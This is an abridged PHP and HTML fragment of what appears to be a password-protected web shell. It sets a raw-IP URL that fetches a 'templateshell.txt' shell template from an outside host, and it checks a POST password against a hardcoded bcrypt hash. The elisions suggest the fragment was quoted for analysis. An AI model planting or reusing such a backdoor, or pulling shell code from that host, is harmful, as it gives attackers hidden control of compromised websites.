...
if (is_logged_in()) {
    ...
    $destiny = 'https://142.93.220.249/temashell/templateshell.txt';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2a$12$rtQCTwMuhr41jfLOCX1/R.e0C1zooBTyIQjALwvh4bI1B61wDCuuO'; 
    ...
    <body>
        ...
        <div class="content">
            <svg 
                ...
                <path d="M100.402 65.7866C102.752 65.7866 104.658 64.0013 104.658 61.7989C104.658 59.5966102.752 57.8113 100.402 57.8113C98.0519 57.8113 96.1466 59.5966 96.1466 61.7989C96.1466 64.0013 98.0519 65.7866 100.402 65.7866Z" stroke="#C5CDE9" stroke-miterlimit="10"/>
